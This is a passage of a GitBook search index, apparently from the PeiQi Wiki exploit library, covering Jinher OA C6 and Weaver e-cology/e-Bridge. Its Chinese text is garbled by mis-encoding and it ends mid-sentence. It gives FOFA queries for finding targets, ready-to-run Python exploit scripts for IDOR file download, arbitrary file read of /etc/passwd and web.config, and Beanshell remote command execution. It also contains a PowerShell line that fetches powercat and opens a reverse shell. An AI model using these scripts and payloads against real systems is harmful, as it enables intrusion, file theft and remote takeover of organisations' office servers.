åå°è¶Šæƒä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 åå°è¶Šæƒä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"é‡‘å’ŒOA C6 åå°è¶Šæƒä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"é‡‘å’ŒOA C6 è¶Šæƒä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° é‡‘å’ŒOA C6 å­˜åœ¨è¶Šæƒä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæ™®é€šç”¨æˆ·ç™»å½•åå¯ä»¥é€šè¿‡éå†IDç¼–å·è·å–ç®¡ç†å‘˜åŠå…¶ä»–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] é‡‘å’ŒOA C6 FOFA [!NOTE] app=\"Jinher-OA\" æ¼æ´å¤ç° ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½• OAåº”ç”¨åå° è®¿é—®çš„POCä¸º http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=RY120330 [!NOTE] æ³¨æ„ RY120330 éœ€è¦ä¸ºç¡®å®šçš„å…¶ä»–çš„ç”¨æˆ·ç¼–å· æ³„éœ²äº†éƒ¨åˆ†çš„æ•æ„Ÿä¿¡æ¯ å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´.html","title":"é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´","keywords":"","body":"é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´ æ¼æ´æè¿° é‡‘å’ŒOA C6 å­˜åœ¨åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´ï¼Œæ™®é€šç”¨æˆ·é€šè¿‡éå†ç‰¹æ®Šå‚æ•°å¯ä»¥è·å–å…¶ä»–ç”¨æˆ·ä¸Šä¼ çš„æ•æ„Ÿæ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] é‡‘å’ŒOA C6 FOFA [!NOTE] app=\"Jinher-OA\" æ¼æ´å¤ç° ç™»å½•åç‚¹å‡»ä¿¡æ¯äº¤æµï¼Œå‘èµ·ååŒé¡µé¢ ä¸Šä¼ é™„ä»¶å¹¶ä¸Šä¼ å‘é€ç»™ç›®æ ‡ [!NOTE] è¿™é‡Œç™»å½•æƒé™ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬è‡ªå·±å‘ç»™è‡ªå·±å°±å¥½ï¼Œå‰æ–‡åªæ˜¯å±•ç°æ¼æ´æŒ–æ˜æ€è·¯è¿‡ç¨‹ æˆåŠŸæ”¶åˆ°ä¸Šä¼ çš„é™„ä»¶ ç‚¹å‡»æŸ¥çœ‹æ—¶æŠ“åŒ…ï¼Œå‘ç°ä¸€ä¸ªå¸¦æœ‰æ–‡ä»¶IDçš„è¯·æ±‚åŒ… è¿”å›äº†å‡ ä¸ªå‚æ•° var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png'; var strFileType = 'png'; var strSid='3jvpvhs410m2wdbbficax5q5'; var strFileIDCode='us9w7xWE7do='; var strId = '1229'; var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log'; var strImgReg = 'jpg,gif,jpeg,png,ico'; var MD = ''; å…¶ä¸­æˆ‘ä»¬æ³¨æ„åˆ° strFilePath ä¸ºæ–‡ä»¶çš„å­˜å‚¨åœ°å€ï¼Œæˆ‘ä»¬æ›´æ”¹ idå‚æ•°ä¸ºå¦ä¸€ä¸ªå€¼ï¼Œä¸”æµ‹è¯•åå‘ç° nameæ–‡ä»¶åå‚æ•°æ— å…³ç´§è¦ æ›´æ”¹IDåå‘é€è¯·æ±‚åŒ…å‘ç°è·å¾—å¦ä¸€ä¸ªæ–‡ä»¶çš„ä¿¡æ¯ è®¿é—®Urlï¼Œæ³¨æ„ typeå‚æ•° éœ€è¦ä¸ºæ­£ç¡®çš„æ–‡ä»¶åç¼€æ‰å¯ä»¥è®¿é—® http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf è¿™é‡Œæ›´æ¢ä¸€ä¸ªæ™®é€šç”¨æˆ·æµ‹è¯•æ˜¯å¦å¯è¡Œï¼Œå°è¯•éå† id å­˜åœ¨ strFilePathå‚æ•° åˆ™æ˜¯å­˜åœ¨æ–‡ä»¶ï¼Œä¸ºç©ºåˆ™æ˜¯æ–‡ä»¶å·²ç»ä¸å­˜åœ¨ åŒæ—¶æŠ“åŒ…ä¸‹è½½æ–‡ä»¶é¡µé¢ä¹Ÿå¯ä»¥çœ‹åˆ°å¯è·å–çš„å‚æ•° FileID ä¸ FileIDCode äºæ˜¯åªéœ€è¦é€šè¿‡åˆšåˆšçš„IDéå†ï¼Œè·å–ä¸¤ä¸ªå…³é”®å‚æ•°å°±èƒ½ä¸‹è½½å…¶ä»–äººå‘é€çš„æ•æ„Ÿæ–‡ä»¶ï¼Œä¸”åªéœ€è¦æ™®é€šç”¨æˆ·æƒé™ æ¼æ´åˆ©ç”¨POC [!NOTE] POCåªæ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä¸”æ¼æ´å­˜åœ¨äºåå°éœ€è¦ç™»å½• è¿è¡Œåè®¿é—®é“¾æ¥å³å¯ä¸‹è½½æ–‡ä»¶ import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é‡‘å’ŒOA C6 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_id, cookie): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id={}&name=&type=pdf\".format(file_id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\":cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ Url: {}\\033[0m\".format(vuln_url)) if \"strFilePath =\" in response.text and response.status_code == 200: strFilePath = re.findall(r\"var strFilePath = '(.*?)';\", response.text)[0] strFileType = strFilePath[-3:] strFileIDCode = re.findall(r\"var strFileIDCode='(.*?)';\", response.text)[0] strId = re.findall(r\"var strId = '(.*?)';\", response.text)[0] sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0] if strFilePath != \"\": print(\"\\033[36m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´, è·å–æ–‡ä»¶ä¿¡æ¯:\\n[o] æ–‡ä»¶è·¯å¾„ï¼š{}\\n[o] æ–‡ä»¶ç±»å‹ï¼š{}\\n[o] æ–‡ä»¶ID codeï¼š{}\\n[o] æ–‡ä»¶ç¼–å·ï¼š {}\\033[0m\".format(target_url, strFilePath, strFileType,strFileIDCode, strId )) print(\"\\033[32m[o] æ–‡ä»¶ä¸‹è½½é“¾æ¥ä¸º: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}\".format(target_url, strId, strFileIDCode, sid)) else: print(\"\\033[31m[x] ç›®æ ‡ {} æ–‡ä»¶ä¸å­˜åœ¨ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_id = str(input(\"\\033[35mFile_id >>> \\033[0m\")) cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, file_id, cookie) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° é‡‘å’ŒOA C6 download.jspæ–‡ä»¶å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æœåŠ¡å™¨ä¸­çš„æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] é‡‘å’ŒOA FOFA [!NOTE] app=\"Jinher-OA\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´æ–‡ä»¶ä¸º download.asp \"\" Then '******************************ä¸‹è½½æ–‡ä»¶å­˜æ”¾çš„æœåŠ¡ç«¯ç›®å½• url=server.MapPath(Dname) 'url=server.MapPath(\"./\")&\"\\Jhsoft.Web.module\\testbill\\dj\"&Dname 'è¿™è¾¹åšäº†ä¸€ä¸‹æ”¹åŠ¨By Fanshui '*************************************************** End If 'Response.write url 'response.end Set fso=Server.CreateObject(\"Scripting.FileSystemObject\") Set fl=fso.getfile(url) flsize=fl.size flName=fl.name Set fl=Nothing Set fso=Nothing 'Response.write flName 'Response.write flsize %> è¯·æ±‚çš„POCä¸º /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config è¯»å– web.config /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 09:32:27 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/","title":"æ³›å¾®OA","keywords":"","body":"æ³›å¾®OA æ³›å¾®OA weaver.common.Ctrl ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å– æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´ æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥(ä»…é™oracleæ•°æ®åº“) CNVD-2019-34241 æ³›å¾®OA sysinterface/codeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼  WooYun-2015-0155705 æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼  PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-16 21:59:01 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å–.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å–.html","title":"æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å–","keywords":"","body":"æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å– æ¼æ´æè¿° æ³›å¾®äº‘æ¡¥ï¼ˆe-Bridgeï¼‰æ˜¯ä¸Šæµ·æ³›å¾®å…¬å¸åœ¨â€äº’è”ç½‘+â€çš„èƒŒæ™¯ä¸‹ç ”å‘çš„ä¸€æ¬¾ç”¨äºæ¡¥æ¥äº’è”ç½‘å¼€æ”¾èµ„æºä¸ä¼ä¸šä¿¡æ¯åŒ–ç³»ç»Ÿçš„ç³»ç»Ÿé›†æˆä¸­é—´ä»¶ã€‚æ³›å¾®äº‘æ¡¥å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] æ³›å¾®äº‘æ¡¥ e-Bridge 2018-2019 å¤šä¸ªç‰ˆæœ¬ FOFA [!NOTE] title=\"æ³›å¾®äº‘æ¡¥e-Bridge\" æ¼æ´å¤ç° [!NOTE] åˆ†ä¸ºä¸¤ç§ï¼Œåˆ†åˆ«ä¸º Windows å’Œ Linux Windows è®¿é—® http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt æˆåŠŸè¿”å› idå€¼,è¯´æ˜å«æœ‰æ­¤æ¼æ´ è°ƒç”¨æŸ¥çœ‹æ–‡ä»¶æ¥å£è®¿é—® http://xxx.xxx.xxx.xxx/file/fileNoLogin/idå€¼ Linux è®¿é—® http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt æˆåŠŸè¿”å› idå€¼,è¯´æ˜å«æœ‰æ­¤æ¼æ´ è°ƒç”¨æŸ¥çœ‹æ–‡ä»¶æ¥å£è®¿é—® http://xxx.xxx.xxx.xxx/file/fileNoLogin/idå€¼ æ¼æ´åˆ©ç”¨POC [!NOTE] æ³¨æ„è¯»å–Linuxç³»ç»Ÿæ–‡ä»¶æ—¶ï¼Œéœ€è¦å®Œæ•´è·¯å¾„ ä¾‹å¦‚è¯»å–æ ¹ç›®å½•ä¸‹çš„ 1.txt åº”ä¸º /1.txt è€Œä¸æ˜¯ 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: æ³›å¾®äº‘æ¡¥ e-Bridge \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') # åˆ¤æ–­æ“ä½œç³»ç»Ÿ or åˆ¤æ–­æ¼æ´æ˜¯å¦å¯åˆ©ç”¨ def POC_1(target_url): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10) response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10) response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10) if \"æ— æ³•éªŒè¯æ‚¨çš„èº«ä»½\" in response_1.text and \"æ— æ³•éªŒè¯æ‚¨çš„èº«ä»½\" in response_2.text: print(\"\\033[31m[x] æ¼æ´å·²ä¿®å¤ï¼Œä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) else: if \"No such file or directory\" in response_1.text: print(\"\\033[32m[o] ç›®æ ‡ä¸º Linux ç³»ç»Ÿ\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_3.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) return id,\"linux\" elif \"ç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šçš„è·¯å¾„\" in response_2.text: print(\"\\033[32m[o] ç›®æ ‡ä¸º Windows ç³»ç»Ÿ\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_1.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) return id,\"windows\" else: print(\"\\033[31m[x] æ— æ³•è·å–ç›®æ ‡ç³»ç»Ÿ\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # éªŒè¯æ¼æ´ def POC_2(target_url, id): file_url = target_url + \"/file/fileNoLogin/{}\".format(id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) response.encoding = 'GBK' print(\"\\033[32m[o] æˆåŠŸè¯»å–ï¼š\\n\\033[0m{}\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # windows æ–‡ä»¶è¯»å– def POC_3(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) POC_2(target_url, id) except : print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œæ— æ³•è¯»å–æ–‡ä»¶ \\033[0m)\") # linuxè¯»å–æ–‡ä»¶ def POC_4(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) POC_2(target_url, id) except: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œæ— æ³•è¯»å–æ–‡ä»¶ \\033[0m)\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) id,system = POC_1(target_url) POC_2(target_url, id) while True: if system == \"windows\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_3(target_url, File) if system == \"linux\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_4(target_url, File) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204.html","title":"æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204","keywords":"","body":"æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 æ¼æ´æè¿° 2019å¹´9æœˆ17æ—¥æ³›å¾®OAå®˜æ–¹æ›´æ–°äº†ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´è¡¥ä¸, æ³›å¾®e-cology OAç³»ç»Ÿçš„Java Beanshellæ¥å£å¯è¢«æœªæˆæƒè®¿é—®, æ”»å‡»è€…è°ƒç”¨è¯¥Beanshellæ¥å£, å¯æ„é€ ç‰¹å®šçš„HTTPè¯·æ±‚ç»•è¿‡æ³›å¾®æœ¬èº«ä¸€äº›å®‰å…¨é™åˆ¶ä»è€Œè¾¾æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œ, æ¼æ´ç­‰çº§ä¸¥é‡. FOFA [!NOTE] app=â€œæ³›å¾®-ååŒåŠå…¬OAâ€ å½±å“ç‰ˆæœ¬ [!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 æ¼æ´å¤ç° ç›´æ¥åœ¨ç½‘ç«™æ ¹ç›®å½•ååŠ å…¥ç»„ä»¶è®¿é—®è·¯å¾„ /weaver/bsh.servlet.BshServlet/ï¼Œå¦‚ä¸‹å›¾åœ¨victimä¸Šæ‰§è¡Œäº†å‘½ä»¤â€œwhoamiâ€ è¯·æ±‚åŒ…ä¸º POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=ex\\u0065c(\"cmd /c dir\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw å…³äºç»•è¿‡ eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); ex\\u0065c(\"cmd /c dir\"); IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd æ¼æ´POC https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current Usernameï¼š{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOAï¼ŒPlease confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) #1.install python Dependencies Library pip install requests #2.æ‰¹é‡è„šæœ¬ æ‰§è¡Œ python Weaver-Ecology-OA_RCE-exp.py url.txtæ–‡ä»¶ä¸­ æ˜¯urlåœ°å€ éœ€è¦å¸¦httpåè®® æœ‰ä»»ä½•é—®é¢˜è¯·issue PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®E-Cology WorkflowServiceXml RCE.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®E-Cology WorkflowServiceXml RCE.html","title":"æ³›å¾®E-Cology WorkflowServiceXml RCE","keywords":"","body":"æ³›å¾®E-Cology WorkflowServiceXml RCE æ¼æ´æè¿° æ³›å¾®E-cology OAç³»ç»Ÿçš„WorkflowServiceXmlæ¥å£å¯è¢«æœªæˆæƒè®¿é—®ï¼Œæ”»å‡»è€…è°ƒç”¨è¯¥æ¥å£ï¼Œå¯æ„é€ ç‰¹å®šçš„HTTPè¯·æ±‚ç»•è¿‡æ³›å¾®æœ¬èº«ä¸€äº›å®‰å…¨é™åˆ¶ä»è€Œè¾¾æˆè¿œç¨‹ä»£ç æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] E-cology FOFA [!NOTE] app=\"æ³›å¾®-ååŒåŠå…¬OA\" æ¼æ´å¤ç° æ¼æ´åŸç†æ¥æº https://www.anquanke.com/post/id/239865 æ ¹æ®æµé‡å¯ä»¥å¾—çŸ¥è·¯ç”±ä¸º/services%20/WorkflowServiceXmlï¼Œæˆ‘éšå³æŸ¥çœ‹äº†è¯¥OAçš„web.xmlã€‚ å‘ç°äº†ç›¸å…³ç±»ä¸ºweaver.workflow.webservices.WorkflowServiceXmlã€weaver.workflow.webservices.WorkflowServiceImplXmlã€‚ å…³äºç±»çš„ä¸œè¥¿å…ˆæ”¾åˆ°ä¸€æ—ï¼Œæ¯•ç«Ÿè·¯ç”±æ˜¯å¦çœŸå®å­˜åœ¨ã€%20æœ‰ä»€ä¹ˆæ„ä¹‰æ‰æ˜¯é‡ç‚¹ã€‚æˆ‘å¼€å§‹éªŒè¯è·¯ç”±çš„å­˜åœ¨ã€‚è¿™é‡Œæˆ‘æµ‹è¯•äº†ä¸¤ä¸ªç‰ˆæœ¬ã€‚ å¸¦ä¸Š%20è¯•è¯• æ ¹æ®è¿™ä¸ªresponseå¯ä»¥çœ‹å‡ºè¿™åº”è¯¥æ˜¯ä¸€ä¸ªsoap xmlæ³¨å…¥ï¼Œå…·ä½“æ˜¯XMLDecoderã€XStreamæˆ–è€…å…¶ä»–ä»€ä¹ˆï¼Œè¿˜å¾—çœ‹weaver.workflow.webservices.WorkflowServiceXmlã€weaver.workflow.webservices.WorkflowServiceImplXml. é¦–å…ˆï¼Œå…ˆçœ‹çœ‹weaver.workflow.webservices.WorkflowServiceXml å¯ä»¥æ³¨æ„åˆ°è¿™æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œå…¶ä¸­ä¸€ä¸ªæ–¹æ³•doCreateWorkflowRequestæ¯”è¾ƒå¯ç–‘ã€‚ å»weaver.workflow.webservices.WorkflowServiceImplXmlçœ‹çœ‹è¿™ä¸ªæ–¹æ³•çš„å®ç°ã€‚ ç»§ç»­è·Ÿè¸ªçœ‹çœ‹ 